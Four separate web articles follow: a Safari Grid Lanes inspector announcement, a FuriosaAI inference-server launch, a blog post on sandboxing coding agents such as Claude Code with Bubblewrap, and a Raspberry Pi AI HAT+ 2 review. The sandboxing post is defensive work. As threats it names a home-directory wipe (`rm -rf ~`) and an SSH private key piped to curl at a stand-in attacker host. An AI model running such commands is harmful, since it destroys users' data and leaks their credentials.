    &lt;head rend="h1"&gt;New Safari developer tools provide insight into CSS Grid Lanes&lt;/head&gt;
    &lt;p&gt;You might have heard recently that Safari Technology Preview 234 landed the final plan for supporting masonry-style layouts in CSS. It’s called Grid Lanes.&lt;/p&gt;
    &lt;p&gt;CSS Grid Lanes adds a whole new capability to CSS Grid. It lets you line up content in either columns or rows — and not both.&lt;/p&gt;
    &lt;p&gt;This layout pattern allows content of various aspect ratios to pack together. No longer do you need to truncate content artificially to make it fit. Plus, the content that’s earlier in the HTML gets grouped together towards the start of the container. If new items get lazy loaded, they appear at the end without reshuffling what’s already on screen.&lt;/p&gt;
    &lt;p&gt;It can be tricky to understand the content flow pattern as you are learning Grid Lanes. The content is not flowing down the first column to the very bottom of the container, and then back up to the top of the second column. (If you want that pattern, use CSS Multicolumn or Flexbox.)&lt;/p&gt;
    &lt;p&gt;With Grid Lanes, the content flows perpendicular to the layout shape you created. When you define columns, the content flows back and forth across those columns, just like to how it would if rows existed. If you define rows, the content will flow up and down through the rows — in the column direction, as if columns were there.&lt;/p&gt;
    &lt;p&gt;Having a way to see the order of items can make it easier to understand this content flow. Introducing the CSS Grid Lanes Inspector in Safari. It’s just the regular Grid Inspector, now with more features.&lt;/p&gt;
    &lt;p&gt;Safari’s Grid Inspector already reveals the grid lines for Grid Lanes, and labels track sizes, line numbers, line names, and area names. Now it has a new feature — “Order Numbers”.&lt;/p&gt;
    &lt;p&gt;By turning on the order numbers in the example above, we can clearly see how Item 1, 2, 3, and 4 flow across the columns, as if there were a row. Then Item 5 is in the middle right, followed by Item 6 on the far right, and so on.&lt;/p&gt;
    &lt;p&gt;You might be tempted to believe the content order doesn’t matter. With pages like this photo gallery — most users will have no idea how the photos are ordered in the HTML. But for many users, the content order has a big impact on their experience. You should always consider what it’s like to tab through content — watching one item after another sequentially come into focus. Consider what it’s like to listen to the site through a screenreader while navigating by touch or keyboard. With Grid Lanes, you can adjust &lt;code&gt;flow-tolerance&lt;/code&gt; to reduce the jumping around and put items where people expect.&lt;/p&gt;
    &lt;p&gt;To know which value for flow tolerance to choose, it really helps to quickly see the order of items. That makes it immediately clear how your CSS impacts the result.&lt;/p&gt;
    &lt;p&gt;Order Numbers in the Grid Inspector is an extension of a feature Safari’s Flexbox Inspector has had since Safari 16.0 — marking the order of Flex items. Seeing content order is also helpful when using the &lt;code&gt;order&lt;/code&gt; property in Flexbox.&lt;/p&gt;
    &lt;p&gt;Order Numbers in Safari’s Grid Inspector works for CSS Grid and Subgrid, as well as Grid Lanes.&lt;/p&gt;
    &lt;head rend="h3"&gt;Try out Safari’s layout tooling&lt;/head&gt;
    &lt;p&gt;The Grid and Flexbox layout inspectors might seem similar across browsers, but the team behind Safari’s Web Inspector has taken the time to finely polish the details. In both the Grid and Flexbox Inspectors, you can simultaneously activate as many overlays as you want. No limits. And no janky scrolling due to performance struggles.&lt;/p&gt;
    &lt;p&gt;Safari’s Flexbox Inspector visually distinguishes between excess free space and Flex gaps, since knowing which is which can solve confusion. It shows the boundaries of items, revealing how they are distributed both on the main axis and the cross axis of Flexbox containers. And it lists all the Flexbox containers, making it easier to understand what’s happening overall.&lt;/p&gt;
    &lt;p&gt;Our Grid Inspector has a simple and clear interface, making it easy to understand the options. It also lists all Grid containers. And of course, you can change the default colors of the overlays, to best contrast with your site content.&lt;/p&gt;
    &lt;p&gt;And Safari’s Grid and Flexbox Inspectors are the only browser devtools that label content order. We hope seeing the order of content in Grid Lanes helps you understand it more thoroughly and enjoy using this powerful new layout mechanism.&lt;/p&gt;
    &lt;head rend="h3"&gt;Try out Order Numbers&lt;/head&gt;
    &lt;p&gt;Order Numbers in Safari’s Grid Inspector shipped today in Safari Technology Preview 235. Let us know what you think. There’s still time to polish the details to make the most helpful tool possible. You can ping Jen Simmons on Bluesky or Mastodon with links, comments and ideas.&lt;/p&gt;

    &lt;head rend="h1"&gt;Introducing Furiosa NXT RNGD Server: Efficient AI inference at data center scale&lt;/head&gt;
    &lt;p&gt;News&lt;/p&gt;
    &lt;p&gt;We are excited to introduce FuriosaAI’s NXT RNGD Server—our first branded, turnkey solution for AI inference.&lt;/p&gt;
    &lt;p&gt;Built around our RNGD accelerators, NXT RNGD Server is an optimized system that delivers high performance on today’s most important AI workloads while fitting seamlessly into existing data center environments.&lt;/p&gt;
    &lt;p&gt;With NXT RNGD Server, enterprises can move from experimentation to deployment faster than ever. The system ships with the Furiosa SDK and Furiosa LLM runtime preinstalled, so applications can serve immediately upon installation. We optimized the platform over standard PCIe interconnects, eliminating the need for proprietary fabrics or exotic infrastructure.&lt;/p&gt;
    &lt;p&gt;Designed for compatibility, NXT RNGD Server runs at just 3 kW per system, allowing organizations to scale AI within the power and cooling limits of most modern facilities. This makes NXT RNGD Server a practical and cost-effective system to build out AI factories inside the data centers enterprises already operate.&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical Specifications&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Compute: Up to 8 × RNGD accelerators (4 petaFLOPS FP8 per server) with dual AMD EPYC processors. Supports BF16, FP8, INT8, and INT4&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Memory: 384 GB HBM3 (12 TB/s bandwidth) plus 1 TB DDR5 system memory&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Storage: 2 × 960 GB NVMe M.2 (OS), 2 × 3.84 TB NVMe U.2 (internal)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Networking: 1G management NIC plus 2 × 25G data NICs&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Power &amp;amp; Cooling: 3 kW system power, redundant 2,000 W Titanium PSUs, air-cooled&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Security &amp;amp; Management: Secure Boot, TPM, BMC attestation, dual management paths (PCIe + I2C)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Software: Preinstalled Furiosa SDK and Furiosa LLM runtime with native Kubernetes and Helm integration&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Real-world benefits and proven performance&lt;/head&gt;
    &lt;p&gt;NXT RNGD Server’s superior power efficiency significantly lowers businesses’ TCO. Enterprise customers can run advanced AI efficiently at scale within current infrastructure and power limitations – using on-prem servers or cloud data centers. This is crucial for leveraging existing infrastructure, since more than 80% of data centers today are air-cooled and operate at 8 kW per rack or less. &lt;/p&gt;
    &lt;p&gt;For businesses with sensitive workloads, regulatory compliance requirements, or enhanced privacy and security needs, NXT RNGD Server offers complete control over enterprise data, with model weights running entirely on local infrastructure.&lt;/p&gt;
    &lt;p&gt;Global enterprises have validated NXT RNGD Server’s performance. In July, LG AI Research announced that it has adopted RNGD for inference computing with its EXAONE models. Running LG’s EXAONE 3.5 32B model on a single server with four RNGD cards and a batch size of one, LG AI Research achieved 60 tokens/second with a 4K context window and 50 tokens/second with a 32K context window.&lt;/p&gt;
    &lt;p&gt;We are now working with LG AI Research to supply NXT RNGD servers to enterprises using EXAONE across key sectors, including electronics, finance, telecommunications, and biotechnology.&lt;/p&gt;
    &lt;head rend="h2"&gt;Making rapid deployment of advanced AI available to everyone&lt;/head&gt;
    &lt;p&gt;With global data center demand at 60 GW in 2024 and expected to triple by the end of the decade, the industry faces a once-in-a-generation transformation. More than 80 percent of facilities today are air-cooled and operate at 8 kW per rack or less, making them poorly suited for GPU-based systems that require liquid cooling and 10 kW+ per server.&lt;/p&gt;
    &lt;p&gt;NXT RNGD Server provides a practical path forward. It allows organizations to deploy advanced AI within their existing facilities, without prohibitive energy costs or disruptive retrofits. Engineered as a plug-and-play system, NXT RNGD combines AI-optimized silicon with Furiosa LLM, a vLLM-compatible serving framework featuring built-in OpenAI API support, enabling organizations to deploy and scale AI workloads from day one.&lt;/p&gt;
    &lt;p&gt;By combining silicon and system design, NXT RNGD Server makes efficient, enterprise-ready, and future-proof AI infrastructure a reality.&lt;/p&gt;
    &lt;head rend="h2"&gt;Availability&lt;/head&gt;
    &lt;p&gt;We are taking inquiries and orders for January 2026.&lt;/p&gt;
    &lt;p&gt;Download the datasheet here and sign up for RNGD updates here.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;Last week I wrote a thing about how to run Claude Code when you don’t trust Claude Code. I proposed the creation of a dedicated user account &amp;amp; standard unix access controls. The objective was to stop Claude from dancing through your .env files, eating your secrets. There are some usability problems with that guide- I found a better approach and I wanted to share.&lt;/p&gt;
    &lt;p&gt;TL;DR: Use Bubblewrap to sandbox Claude Code (and other AI agents) without trusting anyone’s implementation but your own. It’s simpler than Docker and more secure than a dedicated user account. Bubblewrap delivers a sweet spot combination of control AND flexibility that enables experimentation.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Changed Since My Last Post&lt;/head&gt;
    &lt;p&gt;Immediately after publishing, I caught the flu. During three painful days in bed, I realized there are other better approaches. Firejail would likely work well- but also there’s another solution called Bubblewrap.&lt;/p&gt;
    &lt;p&gt;As I dug into Bubblewrap, I realized something else… Anthropic uses Bubblewrap!&lt;/p&gt;
    &lt;p&gt;But Anthropic embeds bubblewrap in their client. This implementation has a major disadvantage.&lt;/p&gt;
    &lt;p&gt;Embedding bubblewrap in the client means you have to trust the correctness and security of Anthropic’s implementation. They deserve credit for thinking about security, but this puzzles me. Why not publish guidance so users can secure themselves from Claude Code? Aren’t we going to need this for ALL agents? Isn’t this solution generalizable?&lt;/p&gt;
    &lt;p&gt;Defense-in-depth means we don’t rely on any single vendor to execute perfectly 100% of the time. Plus, this problem applies to all coding agents, not just Claude Code. I want an approach that doesn’t tie my security to Anthropic’s destiny.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Security Problem We’re Solving&lt;/head&gt;
    &lt;p&gt;Before we dive into Bubblewrap, here’s what we’re protecting against:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;You want to run a binary that will execute under your account’s permissions&lt;/item&gt;
      &lt;item&gt;Your account has access to sensitive files unrelated to the project you’re working on&lt;/item&gt;
      &lt;item&gt;You want your binary to invoke other standard system tools like &lt;code&gt;ls&lt;/code&gt;,&lt;code&gt;ps -aux&lt;/code&gt;, or&lt;code&gt;less&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;We want to invoke this binary while easily preventing it from accessing sensitive files unrelated to binary’s activities&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;What if Claude Code has a bug? What happens if the bug is exploited, and bubblewrap constraints embedded within the client are not activated? Will Claude Code run &lt;code&gt;rm -rf ~&lt;/code&gt; or &lt;code&gt;cat ~/.ssh/id_rsa | curl attacker.com&lt;/code&gt;?&lt;/p&gt;
    &lt;p&gt;Without your own wrapping of the agent, you’re at risk. When you wrap your coding agent calls with Bubblewrap, the agent’s access to dangerous commands is prevented.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Is Bubblewrap?&lt;/head&gt;
    &lt;p&gt;Bubblewrap lets you run untrusted or semi-trusted code without risking your host system. We’re not trying to build a reproducible deployment artifact. We’re creating a jail where coding agents can work on your project while being unable to touch &lt;code&gt;~/.aws&lt;/code&gt;, your browser profiles, your ~/Photos library or anything else sensitive.&lt;/p&gt;
    &lt;p&gt;Let’s explore Bubblewrap through the command line:&lt;/p&gt;
    &lt;code&gt;# Install it (Debian/Ubuntu)
sudo apt install bubblewrap

# Simplest possible sandbox - just isolate the filesystem view
bwrap --ro-bind /usr /usr --symlink usr/lib /lib --symlink usr/lib64 /lib64 \
      --symlink usr/bin /bin --proc /proc --dev /dev \
      --unshare-all --die-with-parent \
      /bin/bash

# Inside the sandbox, try:
ls /home          # Empty or nonexistent
ls /etc           # Empty or nonexistent  
whoami            # Shows "nobody" or your mapped user
ping google.com   # Fails - no network
&lt;/code&gt;
    &lt;head rend="h2"&gt;How This Command Works&lt;/head&gt;
    &lt;p&gt;This command creates a minimal sandboxed environment. Here’s what each part does:&lt;/p&gt;
    &lt;head rend="h3"&gt;Filesystem access:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;--ro-bind /usr /usr&lt;/code&gt;mounts your system’s&lt;code&gt;/usr&lt;/code&gt;directory as read-only inside the sandbox&lt;/item&gt;
      &lt;item&gt;The &lt;code&gt;--symlink&lt;/code&gt;commands create shortcuts so programs can find libraries and binaries in expected locations&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--proc /proc&lt;/code&gt;and&lt;code&gt;--dev /dev&lt;/code&gt;give minimal access to system processes and devices&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Isolation:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;--unshare-all&lt;/code&gt;disconnects the sandbox from all system resources (network, shared memory, mount points, etc.)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--die-with-parent&lt;/code&gt;kills the sandbox if your main terminal closes&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;The Result:&lt;/head&gt;
    &lt;p&gt;Bash runs inside a stripped-down environment. It can execute programs from &lt;code&gt;/usr&lt;/code&gt; but can’t see your home directory, config files, or access the network. Programs work, but they’re operating in a ghost town version of your filesystem.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Bubblewrap Beats Docker&lt;/head&gt;
    &lt;p&gt;This beats Docker for quick workflows. Docker requires a running daemon and lots of configuration files. Bubblewrap lets you execute your app directly—no daemon, no stale containers cluttering your system.&lt;/p&gt;
    &lt;p&gt;If you’re experienced enough to worry about Docker misconfigurations, Bubblewrap gives you more control when you need it. You just run a command. No YAML files or debugging background services.&lt;/p&gt;
    &lt;head rend="h2"&gt;Quick Start: Running Claude Code with Bubblewrap&lt;/head&gt;
    &lt;p&gt;A big part of the reason for needing this, is –dangerously-skip-permissions. There are times when it’s very useful to give an agent autonomy in desiging, experimenting &amp;amp; implementing systems. Last week, I built a wifi access point that hosts a Quakeworld Server and vends web assembly quake clients. It’s an instant-lan party in a box. I did this unattended and it works. –dangerously-skip-permissions is very powerful- assuming you know how to aim it safely.&lt;/p&gt;
    &lt;p&gt;Here’s how I run Claude Code with &lt;code&gt;--dangerously-skip-permissions&lt;/code&gt; inside a Bubblewrap sandbox:&lt;/p&gt;
    &lt;code&gt;PROJECT_DIR="$HOME/Development/YourProject"
bwrap \
     --ro-bind /usr /usr \
     --ro-bind /lib /lib \
     --ro-bind /lib64 /lib64 \
     --ro-bind /bin /bin \
     --ro-bind /etc/resolv.conf /etc/resolv.conf \
     --ro-bind /etc/hosts /etc/hosts \
     --ro-bind /etc/ssl /etc/ssl \
     --ro-bind /etc/passwd /etc/passwd \
     --ro-bind /etc/group /etc/group \
     --ro-bind "$HOME/.gitconfig" "$HOME/.gitconfig" \
     --ro-bind "$HOME/.nvm" "$HOME/.nvm" \
     --bind "$PROJECT_DIR" "$PROJECT_DIR" \
     --bind "$HOME/.claude" "$HOME/.claude" \
     --tmpfs /tmp \
     --proc /proc \
     --dev /dev \
     --share-net \
     --unshare-pid \
     --die-with-parent \
     --chdir "$PROJECT_DIR" \
     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
     "$(command -v claude)" --dangerously-skip-permissions "Please review Planning/ReportingEnhancementPlan.md"
&lt;/code&gt;
    &lt;head rend="h3"&gt;Key Configuration Lines:&lt;/head&gt;
    &lt;code&gt;# Required for Claude Code to work
--ro-bind "$HOME/.nvm" "$HOME/.nvm" \

# Claude stores auth here. Without this, you'll re-login every time
--bind "$HOME/.claude" "$HOME/.claude" \

# Only add if you understand why you need SSH access
# --ro-bind "$HOME/.ssh" "$HOME/.ssh" \

# Block access to your .env files by overlaying with empty files (You need to know exact path of files 

     --ro-bind /dev/null "$PROJECT_DIR/.env" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.local" \
     --ro-bind /dev/null "$PROJECT_DIR/.env.production" \
&lt;/code&gt;
    &lt;p&gt;Important: Most people don’t need the SSH line. It gives your agent the ability to SSH into systems where you’ve copied a public key. If you don’t understand the utility, don’t add it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Not a Dedicated User Account?&lt;/head&gt;
    &lt;p&gt;My previous post proposed creating a custom user account for Claude on the host OS. This approach has three major problems:&lt;/p&gt;
    &lt;head rend="h3"&gt;1. ACL Tuning Becomes a Usability Nightmare&lt;/head&gt;
    &lt;p&gt;You’ll fight with file permissions constantly. You need to tune Access Control Lists to prevent access to sensitive &lt;code&gt;.env&lt;/code&gt; files. This type of friction has killed security initiatives for decades. Security dies on usability hills.&lt;/p&gt;
    &lt;p&gt;I came up with that approach while getting sick with the flu. Please accept my apologies.&lt;/p&gt;
    &lt;head rend="h3"&gt;2. No Network Connectivity Restrictions&lt;/head&gt;
    &lt;p&gt;A custom account doesn’t solve the network access problem. Claude agents can spin up sockets and connect to whatever they want. Unless you run UFW and restrict outbound connectivity from your host, you risk your agent exfiltrating content.&lt;/p&gt;
    &lt;p&gt;I’ve been creating agents that remotely administer and tune servers. It’s not responsible to let agents have source:any destination:any access to your network or the Internet. One wrong prompt puts you at risk of data exfiltration. My previous solution was incomplete.&lt;/p&gt;
    &lt;head rend="h3"&gt;3. Docker Is the Wrong Tool&lt;/head&gt;
    &lt;p&gt;Docker solves the “it works on my machine” problem when moving code from your laptop to production servers. But most people aren’t deploying frequently enough to maintain strong Docker skills.&lt;/p&gt;
    &lt;p&gt;Setting up filesystems and networking in containers takes mental effort. If you just want to run a command safely, you shouldn’t need to install and configure a background service. People want something that works quickly without the cognitive overhead.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why Use Your Own Bubblewrap Instead of Anthropic’s Sandbox?&lt;/head&gt;
    &lt;p&gt;Everyone makes security mistakes eventually. Claude Code is potentially dangerous. Which approach is safer?&lt;/p&gt;
    &lt;p&gt;Trust Anthropic: Hope their team never makes an implementation mistake that breaks security controls.&lt;/p&gt;
    &lt;p&gt;or&lt;/p&gt;
    &lt;p&gt;Don’t Trust Anthropic: Implement your own access controls in the operating system that constrain the binary at runtime.&lt;/p&gt;
    &lt;p&gt;There is one other big reason you should know how to leverage Bubblewrap. You need a solution for sandboxing agents that aren’t Claude Code.&lt;/p&gt;
    &lt;p&gt;Agents should never be considered trustworthy. Even when they have security controls. Put controls around them—don’t rely on agents built with models that have experienced misalignment.&lt;/p&gt;
    &lt;head rend="h2"&gt;A comparison of what you’re trusting with user-wrapped invocation of bubblewrap versus embedded bubblewrap in a client&lt;/head&gt;
    &lt;head rend="h3"&gt;Running Bubblewrap Yourself:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Linux kernel’s namespace implementation&lt;/item&gt;
      &lt;item&gt;The Bubblewrap binary (small, auditable codebase)&lt;/item&gt;
      &lt;item&gt;Your own configuration (you wrote it, you understand it)&lt;/item&gt;
      &lt;item&gt;Your own proxy/filtering code&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Using Anthropic’s Sandbox Runtime:&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Everything above, plus:&lt;/item&gt;
      &lt;item&gt;Anthropic’s wrapper code and configuration choices&lt;/item&gt;
      &lt;item&gt;Anthropic’s filtering proxy implementation&lt;/item&gt;
      &lt;item&gt;Anthropic’s update/distribution mechanism (npm)&lt;/item&gt;
      &lt;item&gt;That Anthropic’s security interests align with yours&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;The Trust Matrix&lt;/head&gt;
    &lt;p&gt;Trust isn’t binary—it’s about understanding what you’re trusting and why. Here’s a quick comparison:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Threat&lt;/cell&gt;
        &lt;cell role="head"&gt;DIY bwrap&lt;/cell&gt;
        &lt;cell role="head"&gt;Anthropic SRT&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Claude accidentally &lt;code&gt;rm -rf ~&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;✓ Protected&lt;/cell&gt;
        &lt;cell&gt;✓ Protected&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Claude exfiltrating ~/.ssh&lt;/cell&gt;
        &lt;cell&gt;✓ Protected&lt;/cell&gt;
        &lt;cell&gt;✓ Protected&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Supply chain attack via npm&lt;/cell&gt;
        &lt;cell&gt;✓ Not exposed&lt;/cell&gt;
        &lt;cell&gt;✗ Exposed&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Subtle misconfiguration&lt;/cell&gt;
        &lt;cell&gt;✗ Your risk&lt;/cell&gt;
        &lt;cell&gt;✓ Their expertise&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Agent Telemetry you don’t want sent&lt;/cell&gt;
        &lt;cell&gt;✓ You control&lt;/cell&gt;
        &lt;cell&gt;? Their choice&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Novel bypass techniques&lt;/cell&gt;
        &lt;cell&gt;✗ You’re on your own&lt;/cell&gt;
        &lt;cell&gt;✓ Their team watches&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;So in Anthropic’s defense: this is not cut-and-dried. Most companies don’t have resources for great security teams. You have to decide whether you can own this. Many companies will be wise to rely on Anthropic’s expertise. Their reputation is on the line if someone breaks their sandbox implementation. But you’re going to be locked into Anthropic’s security model if you don’t learn how to wield bubblewrap. Pivoting to a new agent will require figuring out security there. Why not just rip the band aid off and learn bubblewrap?&lt;/p&gt;
    &lt;head rend="h2"&gt;Don’t trust me either!&lt;/head&gt;
    &lt;p&gt;This has been a fun writeup on trusting trust. TRUST ME!&lt;/p&gt;
    &lt;p&gt;But you shouldn’t trust me! I might be a Dog on the Internet. Maybe I’m ai slop?!&lt;/p&gt;
    &lt;p&gt;Here is some code you can use to test the bwrap container I provided for my claude usage. Note that this is invoked different- we’re not going to call claude- we’re going to call bash and pass it the test script. My test script is available here:&lt;/p&gt;
    &lt;p&gt;All you need to do is create a YourProject folder in your ~/$HOME/Development directory. Then create a sandbox-escape-test.sh in there. Fill it with the test code from my github.&lt;/p&gt;
    &lt;p&gt;Read and understand what the script does before executing it. This post is already pretty long 😀&lt;/p&gt;
    &lt;head rend="h2"&gt;Wrapping Up&lt;/head&gt;
    &lt;p&gt;I’m building with many agents—not just Claude Code. I need a generalized solution for sandboxing that I can apply to other agents.&lt;/p&gt;
    &lt;p&gt;Anthropic deserves attention and credit for the constraints they’re giving you. I wish they had published them in a way that doesn’t tie your security destiny to their ability to execute correctly 100% of the time.&lt;/p&gt;
    &lt;p&gt;The choice is yours: trust a vendor’s implementation, or take control of your own security boundaries. Both are valid. I might be paranoid. Are you feeling lucky?&lt;/p&gt;
    &lt;p&gt;p.s. If I ever get run over by a flaming pizza truck, here’s a handy 1 liner:&lt;/p&gt;
    &lt;code&gt;claude "Act as a security expert with a specialization in Linux system security.  Help me generate a bubblewrap script for safely invoking coding agents so they do not have access to sensitive data on my file system and appropriately manage other security risks, even though they're going to be invoked under my account's permissions.  Let's talk through everything that the agent should be able to do &amp;amp; access first, and then generate an appropriate bwrap script for delivering that capability.  Then let's discuss what access we should restrict."&lt;/code&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Raspberry Pi's new AI HAT adds 8GB of RAM for local LLMs&lt;/head&gt;
    &lt;p&gt;Today Raspberry Pi launched their new $130 AI HAT+ 2 which includes a Hailo 10H and 8 GB of LPDDR4X RAM.&lt;/p&gt;
    &lt;p&gt;With that, the Hailo 10H is capable of running LLMs entirely standalone, freeing the Pi's CPU and system RAM for other tasks. The chip runs at a maximum of 3W, with 40 TOPS of INT8 NPU inference performance in addition to the equivalent 26 TOPS INT4 machine vision performance on the earlier AI HAT with Hailo 8.&lt;/p&gt;
    &lt;p&gt;In practice, it's not as amazing as it sounds.&lt;/p&gt;
    &lt;p&gt;You still can't upgrade the RAM on the Pi, but at least this way if you do have a need for an AI coprocessor, you don't have to eat up the Pi's memory to run things on it.&lt;/p&gt;
    &lt;p&gt;And it's a lot cheaper and more compact than running an eGPU on a Pi. In that sense, it's more useful than the silly NPUs Microsoft forces into their 'AI PCs'.&lt;/p&gt;
    &lt;p&gt;But it's still a solution in search of a problem, in all but the most niche of use cases.&lt;/p&gt;
    &lt;p&gt;Besides feeling like I'm living in the world of the Turbo Encabulator every time I'm testing AI hardware, I find the marketing of these things to be very vague, and the applications not very broad.&lt;/p&gt;
    &lt;p&gt;For example, the Hailo 10H is advertised as being used for a Fujitsu demo of automatic shrink detection for a self-checkout.&lt;/p&gt;
    &lt;p&gt;That's certainly not a worthless use case, but it's not something I've ever needed to do. I have a feeling this board is meant more for development, for people who want to deploy the 10H in other devices, rather than as a total solution to problems individual Pi owners need to solve.&lt;/p&gt;
    &lt;p&gt;Especially when it comes to the headline feature: running inference, like with LLMs.&lt;/p&gt;
    &lt;head rend="h2"&gt;Video&lt;/head&gt;
    &lt;p&gt;I also published a video with all the information in this blog post, but if you enjoy text more than video, scroll on pastâit doesn't offend me!&lt;/p&gt;
    &lt;head rend="h2"&gt;LLM performance on the AI HAT+ 2&lt;/head&gt;
    &lt;p&gt;I ran everything on an 8 gig Pi 5, so I could get an apples-to-apples comparison, running the same models on the Pi's CPU as I did on the AI HAT's NPU.&lt;/p&gt;
    &lt;p&gt;They both have the same 8GB LPDDR4X RAM configuration, so ideally, they'd have similar performance.&lt;/p&gt;
    &lt;p&gt;I tested every model Hailo put out so far, and compared them, Pi 5 versus Hailo 10H:&lt;/p&gt;
    &lt;p&gt;The Pi's built-in CPU trounces the Hailo 10H.&lt;/p&gt;
    &lt;p&gt;The Hailo is only close, really, on Qwen2.5 Coder 1.5B.&lt;/p&gt;
    &lt;p&gt;It is slightly more efficient in most cases:&lt;/p&gt;
    &lt;p&gt;But looking more closely at power draw, we can see why the Hailo doesn't keep up:&lt;/p&gt;
    &lt;p&gt;The Pi's CPU is allowed to max out it's power limits (10W on the SoC), which are a lot higher than the Hailo's (3W).&lt;/p&gt;
    &lt;head rend="h2"&gt;Qwen 30B on a Pi&lt;/head&gt;
    &lt;p&gt;So power holds it back, but the 8 gigs of RAM holds back the LLM use case (vs just running on the Pi's CPU) the most. The Pi 5 can be bought in up to a 16 GB configuration. That's as much as you get in decent consumer graphics cards1.&lt;/p&gt;
    &lt;p&gt;Because of that, many quantized medium-size models target 10-12 GB of RAM usage (leaving space for context, which eats up another 2+ GB of RAM).&lt;/p&gt;
    &lt;p&gt;A couple weeks ago, ByteShape got Qwen3 30B A3B Instruct to fit on a 16GB Pi 5. Now this post isn't about LLMs, but the short of it is they found a novel way to compress the model to fit in 10 GB of RAM.&lt;/p&gt;
    &lt;p&gt;A little bit of quality is lost, but like a JPEG, it's still good enough to ace all the contrived tests (like building a TODO list app, or sorting a complex list) that the tiny models I ran on the Hailo 10H didn't complete well (see the video earlier in this post for details).&lt;/p&gt;
    &lt;p&gt;To test the 30B model, I installed llama.cpp following this guide from my blog, and downloaded the compressed model.&lt;/p&gt;
    &lt;p&gt;I asked it to generate a single page TODO list app, and it's still not a speed demon (this is a Pi CPU with LPDDR4x RAM we're talking about), but after a little while, it gave me this:&lt;/p&gt;
    &lt;p&gt;It met all my requirements:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;I can type in as many items as I want&lt;/item&gt;
      &lt;item&gt;I can drag them around to rearrange them&lt;/item&gt;
      &lt;item&gt;I can check off items and they go to the bottom of the list...&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It's honestly crazy how many small tasks you can do even with free local models... even on a Pi. Natural Language Programming was just a dream back when I started my career.&lt;/p&gt;
    &lt;p&gt;Besides being angry Google, OpenAI, Anthropic and all these other companies are consuming all the world's money and resources doing this stuffânot to mention destroying the careers of thousands of junior developersâit is kinda neat to see NLP work for very tightly defined examples.&lt;/p&gt;
    &lt;head rend="h2"&gt;Benchmarking computer vision&lt;/head&gt;
    &lt;p&gt;But I don't think this HAT is the best choice to run local, private LLMs (at least not as a primary goal).&lt;/p&gt;
    &lt;p&gt;What it is good for, is vision processing. But the original AI HAT was good for that too!&lt;/p&gt;
    &lt;p&gt;In my testing, Hailo's hailo-rpi5-examples were not yet updated for this new HAT, and even if I specified the Hailo 10H manually, model files would not load, or I ran into errors once the board was detected.&lt;/p&gt;
    &lt;p&gt;But Raspberry Pi's models ran, so I tested them with a Camera Module 3:&lt;/p&gt;
    &lt;p&gt;I pointed it over at my desk, and it was able to pick out things like my keyboard, my monitor (which it thought was a TV), my phone, and even the mouse tucked away in the back.&lt;/p&gt;
    &lt;p&gt;It all ran quite fastâand 10x faster than on the Pi's CPUâbut the problem is I can do the same thing with the original AI HAT ($110)âor the AI Camera ($70).&lt;/p&gt;
    &lt;p&gt;If you just need vision processing, I would stick with one of those.&lt;/p&gt;
    &lt;p&gt;The headline feature of the AI HAT+ 2 is the ability to run in a 'mixed' mode, where it can process machine vision (frames from a camera or video feed), while also running inference (like an LLM or text-to-speech).&lt;/p&gt;
    &lt;p&gt;Unfortunately, when I tried running two models simultaneously, I ran into segmentation faults or 'device not ready', and lacking any working examples from Hailo, I had to give up on getting that working in time for this post.&lt;/p&gt;
    &lt;p&gt;Just like the original AI HAT, there's some growing pains.&lt;/p&gt;
